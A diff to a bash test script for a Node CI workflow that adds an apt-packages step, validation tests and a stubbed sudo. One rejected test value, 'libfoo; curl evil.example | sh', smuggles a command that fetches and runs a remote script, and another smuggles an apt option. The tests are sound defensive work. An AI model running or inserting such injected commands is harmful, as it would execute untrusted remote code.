@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Runs the exact `run:` scripts of node-ci.yml (validate, detect, require, scripts, summary)
+# Runs the exact `run:` scripts of node-ci.yml (validate, apt, detect, require, scripts, summary)
 # against the fixtures.
 set -uo pipefail
 root=$(cd "$(dirname "$0")/.." && pwd)
@@ -8,7 +8,7 @@ trap 'rm -rf "$work"' EXIT
 # shellcheck source=lib/check.sh
 . "$root/tests/lib/check.sh"
 wf="$root/.github/workflows/node-ci.yml"
-for step in validate detect require scripts summary; do
+for step in validate apt detect require scripts summary; do
   python3 "$root/tests/lib/extract-step.py" "$wf" node-ci "$step" > "$work/$step.sh" || exit 1
 done
 
@@ -29,7 +29,7 @@ run_step() {
 fx="$root/fixtures"
 
 # --- validate ------------------------------------------------------------------------------
-v() { run_step validate "$fx/node-npm" fixtures/node-npm SCRIPTS=lint,typecheck,test,build REQUIRE=lint,build AUDIT=none BUILD_ENV= "$@"; }
+v() { run_step validate "$fx/node-npm" fixtures/node-npm SCRIPTS=lint,typecheck,test,build REQUIRE=lint,build AUDIT=none BUILD_ENV= APT_PACKAGES= "$@"; }
 v
 check "validate: defaults pass and emit both script lists" eval '[ $code = 0 ] && grep -qx "names=lint typecheck test build" <<< "$outputs" && grep -qx "require=lint build" <<< "$outputs"'
 v SCRIPTS=" lint ,typecheck,, test,test ,build" "REQUIRE= lint , build ,"
@@ -56,6 +56,24 @@ v BUILD_ENV='NOEQUALS'
 check "validate: env rejects a line without '='" eval '[ $code = 1 ] && has "$out" "Input '"'"'env'"'"'"'
 v BUILD_ENV='1A=1'
 check "validate: env rejects a key starting with a digit" eval '[ $code = 1 ] && has "$out" "Input '"'"'env'"'"'"'
+v APT_PACKAGES='ffmpeg libgtk-3-dev g++ libc6:amd64'
+check "validate: apt-packages accepts Debian names" eval '[ $code = 0 ]'
+for bad in 'libfoo; curl evil.example | sh' 'ffmpeg  sox' ' ffmpeg' 'FFmpeg' '-o APT::x=1'; do
+  v APT_PACKAGES="$bad"
+  check "validate: apt-packages rejects '$bad'" eval '[ $code = 1 ] && has "$out" "::error::Input '"'"'apt-packages'"'"'"'
+done
+
+# --- apt (sudo stubbed: it records each call, one argument per line) ------------------------
+mkdir -p "$work/bin"
+cat > "$work/bin/sudo" <<'STUB'
+#!/usr/bin/env bash
+printf '%s\n' "$@" "--" >> "$APT_LOG"
+STUB
+chmod +x "$work/bin/sudo"
+: > "$work/apt.log"
+run_step apt "$fx/node-npm" fixtures/node-npm PATH="$work/bin:$PATH" APT_LOG="$work/apt.log" APT_PACKAGES="ffmpeg libc6:amd64"
+apt_calls=$(cat "$work/apt.log")
+check "apt: update, then each package passed as its own argument" eval '[ $code = 0 ] && [ "$apt_calls" = "$(printf "%s\n" apt-get update -- apt-get install -y --no-install-recommends ffmpeg libc6:amd64 --)" ]'
 
 # --- detect --------------------------------------------------------------------------------
 run_step detect "$fx/node-npm" fixtures/node-npm PNPM_VERSION=
